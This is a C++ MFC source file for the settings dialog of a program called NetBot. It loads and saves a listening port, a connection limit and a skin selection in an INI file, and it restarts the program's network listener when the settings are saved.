// SetDlg.cpp : implementation file
//

#include "stdafx.h"
#include "NetBot.h"
#include "SetDlg.h"

#include "NetBotDlg.h"

#include "SkinPPWTL.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

int selectitem = 1;

/////////////////////////////////////////////////////////////////////////////
// CSetDlg dialog


CSetDlg::CSetDlg(CWnd* pParent /*=NULL*/)
    : CDialog(CSetDlg::IDD, pParent)
{
    m_ListenPort = 0;
    m_ConnectMax = 0;
    m_Skin = FALSE;
    m_China = FALSE;
    m_WIN7 = FALSE;
}


void CSetDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialog::DoDataExchange(pDX);
    DDX_Text(pDX, IDC_EDIT_LISTENPORT, m_ListenPort);
    DDV_MinMaxInt(pDX, m_ListenPort, 0, 65500);
    DDX_Text(pDX, IDC_EDIT_CONNECTMAX, m_ConnectMax);
    DDV_MinMaxInt(pDX, m_ConnectMax, 0, 100000);
}


BEGIN_MESSAGE_MAP(CSetDlg, CDialog)
    ON_BN_CLICKED(IDC_BTN_SETSAVE1, OnBtnSetsave1)
    ON_BN_CLICKED(IDC_BTN_SETSAVE4, OnBtnSetsave4)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSetDlg message handlers
void CSetDlg::ReadIniFile()
{
    char Path[255];
    GetCurrentDirectory(255, Path);
    CString path;
    path.Format("%s\\NetBot.ini", Path);
    if (m_Ini.SetPath(path)) {
        CString temp;
        temp = m_Ini.GetKeyValue("Client Setting", "ListenPort");
        m_ListenPort = atoi(temp);
        temp = m_Ini.GetKeyValue("Client Setting", "MaxConnect");
        m_ConnectMax = atoi(temp);
        temp = m_Ini.GetKeyValue("Client Setting", "Skin");

        selectitem = atoi(temp);
    }
    UpdateData(FALSE);
}

BOOL CSetDlg::OnInitDialog()
{
    CDialog::OnInitDialog();

    // Set the small icon for this dialog
    SetIcon(AfxGetApp()->LoadIcon(IDI_OL_CONFIG), FALSE);
    CenterWindow();
    // TODO: Add extra initialization here
    ReadIniFile();

    if (selectitem == 1) {
        ((CButton*)GetDlgItem(IDC_RADIO1))->SetCheck(1);
    } else if (selectitem == 2) {
        ((CButton*)GetDlgItem(IDC_RADIO2))->SetCheck(1);
    } else if (selectitem == 3) {
        ((CButton*)GetDlgItem(IDC_RADIO3))->SetCheck(1);
    }

    return TRUE;
}

void CSetDlg::OnOK()
{
    // TODO: Add extra validation here
    //重载，去除enter键关闭对话框
    //	CDialog::OnOK();
}

void CSetDlg::OnBtnSetsave1()
{
    // TODO: Add your control notification handler code here
    UpdateData();
    CString temp;
    temp.Format("%d", m_ListenPort);
    m_Ini.SetKeyValue("Client Setting", "ListenPort", temp);
    temp.Format("%d", m_ConnectMax);
    m_Ini.SetKeyValue("Client Setting", "MaxConnect", temp);

    ((CNetBotDlg *)AfxGetMainWnd())->StopListen();
    ((CNetBotDlg *)AfxGetMainWnd())->StartListen(m_ListenPort);

    CDialog::OnOK();
}

void CSetDlg::OnBtnSetsave4()
{
    // TODO: Add your control notification handler code here
    UpdateData();

    char strSkin[32];
    if (((CButton*)GetDlgItem(IDC_RADIO1))->GetCheck()) {
        selectitem = 1;
        // SkinH_AttachEx("aero.she", NULL);
    } else if (((CButton*)GetDlgItem(IDC_RADIO2))->GetCheck()) {
        selectitem = 2;
        // SkinH_AttachEx("china.she", NULL);
    } else {
        selectitem = 3;
        // SkinH_AttachEx("Win7Glass.she", NULL);
    }

    sprintf(strSkin, "%d", selectitem);
    m_Ini.SetKeyValue("Client Setting", "Skin", strSkin);

    CDialog::OnOK();
}

void CSetDlg::OnCheckSkin()
{

}

void CSetDlg::OnCheckChina()
{

}

void CSetDlg::OnCheckWin7()
{

}
